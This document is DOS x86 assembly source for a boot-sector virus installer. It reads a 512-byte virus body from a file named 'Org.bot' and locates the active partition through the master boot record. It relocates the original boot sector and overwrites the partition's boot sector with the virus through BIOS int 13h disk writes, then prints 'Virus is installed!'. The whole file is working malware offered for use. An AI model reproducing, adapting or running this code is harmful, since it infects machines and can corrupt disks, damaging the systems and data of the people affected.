	.model tiny
	.code
        .386p
	org  100h

BPB     STRUC
bpb_oem db 8 dup (?)
bpb_b_s dw ?
bpb_s_c db ?
bpb_r_s dw ?
bpb_n_f db ?
bpb_r_e dw ?
bpb_t_s dw ?
bpb_m_d db ?
bpb_s_f dw ?
bpb_s_t dw ?
bpb_n_h dw ?
bpb_h_d dw ?
bpb_sht db 20h dup (?)
BPB     ENDS

start:
	mov  ax,3D00h
	call LoadName
db	'Org.bot',0
LoadName:
	pop  dx
	int  21h
	jnc  NoError
	jmp  Error
NoError:
	xchg ax,bx
	mov  ax,4200h
	xor  cx,cx
	xor  dx,dx
	int  21h
	mov  ah,3Fh
	mov  cx,200h
	mov  dx,offset virus
	int  21h
	cmp  ax,cx
	jne  Error
	mov  ax,201h
	mov  dx,080h
	mov  bx,offset normal
	mov  cx,1
	int  13h
	mov  cl,4
	lea  si,[bx+01aeh]
next:
	add  si,10h
	cmp  byte ptr [si],dl
	loopnz next
	jcxz no_boot
	mov  al,byte ptr [si+4]
	cmp  al,1
	jz   dos12
	cmp  al,4
	jb   no_boot
	cmp  al,6
	ja   no_boot
dos12:
	mov  ax,201h
	mov  dh,byte ptr [si+1]
	push dx
	mov  cx,word ptr [si+2]
	push cx
	int  13h

	cld
	mov  si,offset normal+3
	mov  di,offset virus +3
	mov  cx,3Bh
	rep  movsb

	mov  ax,301h
        call setcxdx
	mov  dl,80h
	int  13h

	mov  ax,301h
	mov  bx,offset virus
	pop  cx
	pop  dx
	int  13h
Success:
	call Load
db	'Virus is installed!','$'
Error:
	call Load
db	'Disk reading error!','$'
no_boot:
	call Load
db	'No active DOS partition found!','$'
Load:
	pop  dx
Show:
	push cs
	pop  ds
	mov  ah,9h
	int  21h
	ret

SETCXDX PROC
        push ax
        cmp dl, 80h
        je harddrive
floppydrive:
        push dx
        mov cx, word ptr es:[bx.bpb_r_e+3]
        shr cx, 4
        movzx ax, byte ptr es:[bx.bpb_n_f+3]
        mul word ptr es:[bx.bpb_s_f+3]
        add cx, ax
        inc cx
        sub cx, word ptr es:[bx.bpb_s_t+3]
        pop dx
        mov dh, 1
        jmp goexit
harddrive:
        push dx
        mov ah, 8
        int 13h
        pop dx
        and cx, 0111111b
        mov dh, 0
goexit:
        pop ax
        ret
ENDP    SETCXDX


normal:
	db   200h dup (?)
virus:
	db   200h dup (?)
end start